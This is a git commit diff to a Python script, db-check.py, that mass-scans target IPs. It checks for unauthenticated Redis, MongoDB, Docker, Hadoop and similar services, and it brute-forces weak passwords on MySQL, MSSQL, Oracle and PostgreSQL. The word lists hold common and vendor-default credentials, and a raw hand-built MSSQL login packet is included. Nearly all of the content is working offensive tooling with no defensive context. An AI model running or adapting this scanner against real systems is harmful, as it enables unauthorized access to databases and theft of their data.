213927a5dfb19ecde46465ef48b78b29758cd857
aspirepig <1766521944@qq.com>
2021-04-16 02:39:39 +0800

    [update] 更新爆破脚本，新增四个数据库

--- db-check.py
+++ db-check.py
@@ -19,17 +19,27 @@ passwd = ['123456','admin','root','password','123123','123','1','','{user}',
           '1q2w3e4r','123qwe','159357','p@ssw0rd','p@55w0rd','password!',
           'p@ssw0rd!','password1','r00t','system','111111','admin']
 
+
 oracle_user = ['sys','system','sysman','scott','aqadm','Dbsnmp']
 oracle_pass_default = ['','manager','oem_temp','tiger','aqadm','dbsnmp']
 
 data = '0200020000000000123456789000000000000000000000000000000000000000000000000000ZZ5440000000000000000000000000000000000000000000000000000000000X3360000000000000000000000000000000000000000000000000000000000Y373933340000000000000000000000000000000000000000000000000000040301060a09010000000002000000000070796d7373716c000000000000000000000000000000000000000000000007123456789000000000000000000000000000000000000000000000000000ZZ3360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000Y0402000044422d4c6962726172790a00000000000d1175735f656e676c69736800000000000000000000000000000201004c000000000000000000000a000000000000000000000000000069736f5f31000000000000000000000000000000000000000000000000000501353132000000030000000000000000'
 
 
-def redis(ip):
+def IsOpen(ip,port):
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    try:
+        s.connect((ip,int(port)))
+        s.shutdown(2)
+        return True
+    except:
+        return False
+
+def redis(ip, port = 6379):
     try:
         socket.setdefaulttimeout(5)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, 6379))
+        s.connect((ip, int(port)))
         s.send(bytes("INFO\r\n", 'UTF-8'))
         result = s.recv(1024).decode()
         if "redis_version" in result:
@@ -40,9 +50,9 @@ def redis(ip):
     finally:
         bar.update(1)
 
-def mongodb(ip):
+def mongodb(ip, port = 27017):
     try:
-        conn = pymongo.MongoClient(ip, 27017, socketTimeoutMS=4000)
+        conn = pymongo.MongoClient(ip, port, socketTimeoutMS=4000)
         dbname = conn.list_database_names()
         print(ip + ":27017 mongodb未授权")
         conn.close()
@@ -51,11 +61,11 @@ def mongodb(ip):
     finally:
         bar.update(1)
 
-def memcached(ip):
+def memcached(ip, port = 11211):
     try:
         socket.setdefaulttimeout(5)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, 11211))
+        s.connect((ip, int(port)))
         s.send(bytes('stats\r\n', 'UTF-8'))
         if 'version' in s.recv(1024).decode():
             print(ip + ":11211 memcached未授权")
@@ -65,7 +75,7 @@ def memcached(ip):
     finally:
         bar.update(1)
 
-def elasticsearch(ip):
+def elasticsearch(ip, port = 11211):
     try:
         url = 'http://' + ip + ':9200/_cat'
         r = requests.get(url, timeout=5)
@@ -76,11 +86,11 @@ def elasticsearch(ip):
     finally:
         bar.update(1)
 
-def zookeeper(ip):
+def zookeeper(ip, port = 2181):
     try:
         socket.setdefaulttimeout(5)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, 2181))
+        s.connect((ip, int(port)))
         s.send(bytes('envi', 'UTF-8'))
         data = s.recv(1024).decode()
         s.close()
@@ -91,9 +101,9 @@ def zookeeper(ip):
     finally:
         bar.update(1)
 
-def ftp(ip):
+def ftp(ip, port = 21):
     try:
-        ftp = ftplib.FTP.connect(ip,21,timeout=5)
+        ftp = ftplib.FTP.connect(ip,port,timeout=5)
         ftp.login('anonymous', 'Aa@12345678')
         print(ip + ":21 FTP未授权")
     except Exception as e:
@@ -101,7 +111,7 @@ def ftp(ip):
     finally:
         bar.update(1)
 
-def CouchDB(ip):
+def CouchDB(ip, port = 5984):
     try:
         url = 'http://' + ip + ':5984'+'/_utils/'
         r = requests.get(url, timeout=5)
@@ -112,7 +122,7 @@ def CouchDB(ip):
     finally:
         bar.update(1)
 
-def docker(ip):
+def docker(ip, port = 2375):
     try:
         url = 'http://' + ip + ':2375'+'/version'
         r = requests.get(url, timeout=5)
@@ -123,7 +133,7 @@ def docker(ip):
     finally:
         bar.update(1)
 
-def Hadoop(ip):
+def Hadoop(ip, port = 50070):
     try:
         url = 'http://' + ip + ':50070'+'/dfshealth.html'
         r = requests.get(url, timeout=5)
@@ -134,28 +144,33 @@ def Hadoop(ip):
     finally:
         bar.update(1)
 
-def mysql(ip):
+def mysql(ip, port = 3306):
+    bar.update(1)
+    if IsOpen(ip, port):
         for pwd in passwd:
             try:
                 pwd = pwd.replace('{user}', 'root')
-                conn = MySQLdb.connect(ip, 'root', pwd, 'mysql')
+                conn = MySQLdb.connect(ip, port = port, user = 'root', passwd = pwd, db = 'mysql')
                 print('{}:3306  Mysql存在弱口令: root  {}'.format( ip, pwd))
                 conn.close()
                 break
             except Exception as e:
                 pass
+                
 
-def mssql( ip):
+def mssql(ip, port = 1433):
+    bar.update(1)
+    if IsOpen(ip, port):
         for pwd in passwd:
             try:
                 pwd = pwd.replace('{user}', 'sa')
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((ip, 1433))
+                s.connect((ip, port))
                 husername = binascii.b2a_hex('sa')
                 lusername = len('sa')
                 lpassword = len(pwd)
                 hpwd = binascii.b2a_hex(pwd)
-                address = binascii.b2a_hex(ip) +'3a'+ binascii.b2a_hex(str(1433))
+                address = binascii.b2a_hex(ip) +'3a'+ binascii.b2a_hex(str(port))
                 data1 = data.replace(data[16:16+len(address)], address)
                 data2 = data1.replace(data1[78:78+len(husername)], husername)
                 data3 = data2.replace(data2[140:140+len(hpwd)], hpwd)
@@ -167,7 +182,7 @@ def mssql( ip):
                     data5 = data4.replace('0Y', str(hex(lpassword)).replace('0x', ''))
                 else:
                     data5 = data4.replace('Y', str(hex(lpassword)).replace('0x', ''))
-                hladd = hex(len(ip) + len(str(1433))+1).replace('0x', '')
+                hladd = hex(len(ip) + len(str(port))+1).replace('0x', '')
                 data6 = data5.replace('ZZ', str(hladd))
                 data7 = binascii.a2b_hex(data6)
                 s.send(data7)
@@ -175,16 +190,16 @@ def mssql( ip):
                     print('{}:1433  SQLserver存在弱口令: sa  {}'.format(ip, pwd))
                     break
             except Exception as e:
-                pass
-            finally:
-                s.close()
+                pass    
 
-def oracle(ip):
+def oracle(ip, port = 1521):
+    bar.update(1)
+    if IsOpen(ip, port):
         for i in range(1, len(oracle_user)):
             try:
                 user = oracle_user[i]
                 pwd  = oracle_pass_default[i]
-                conn = cx_Oracle.connect(user, pwd, ip+':1521/orcl')
+                conn = cx_Oracle.connect(user, pwd, ip+':{}/orcl'.format(port))
                 print('{}:1521  Oracle存在弱口令: {} {}'.format(ip, user, pwd))
                 conn.close()
             except Exception as e:
@@ -199,16 +214,19 @@ def oracle(ip):
             except Exception as e:
                 pass
 
-def postgresql(ip):
+def postgresql(ip, port = 5432):
+    bar.update(1)
+    if IsOpen(ip, port):
         for pwd in passwd:
             try:
                 pwd = pwd.replace('{user}', 'postgres')
-                conn = psycopg2.connect(host=ip, port=5432, user='postgres', password=pwd)
+                conn = psycopg2.connect(host=ip, port=port, user='postgres', password=pwd)
                 print('{}:5432  Postgresql存在弱口令: postgres  {}'.format( ip, pwd))
                 conn.close()
                 break
             except Exception as e:
                 pass
+
 
 
 if __name__ == '__main__':
@@ -218,7 +236,7 @@ if __name__ == '__main__':
     with open(file, "r", encoding='UTF-8') as f:
         line = [i for i in f.readlines()]
         line = list(set(line))
-    bar = tqdm(total=len(line)*9)
+    bar = tqdm(total=len(line)*13)
     with ThreadPoolExecutor(100) as pool:
         for target in line:
             target=target.strip()
